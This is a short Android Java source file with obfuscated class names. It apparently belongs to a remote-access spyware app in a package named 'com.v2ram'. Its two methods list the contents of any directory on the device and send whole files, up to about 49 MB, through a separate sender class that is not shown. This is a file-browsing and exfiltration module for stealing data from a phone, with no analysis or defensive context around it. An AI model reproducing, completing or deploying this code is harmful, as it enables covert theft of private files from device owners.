package com.v2ram;

import android.content.Context;
import java.io.File;
import java.io.FileInputStream;

public class h {
    public static void list(Context c, String dir) {
        File d = new File(dir);
        File[] fs = d.listFiles();
        if (fs == null) { k.send("files: empty or no access"); return; }
        StringBuilder sb = new StringBuilder();
        for (File x : fs) sb.append(x.getName()).append(" | ").append(x.length()).append("\n");
        k.send(sb.toString());
    }

    public static void get(Context c, String path) {
        try {
            File f = new File(path);
            if (!f.exists() || f.isDirectory()) { k.send("nf"); return; }
            if (f.length() > 49_000_000) { k.send("too big, use split"); return; }
            k.sendFile(f, f.getName());
        } catch (Throwable t) { k.send("get err: " + t.getMessage()); }
    }
}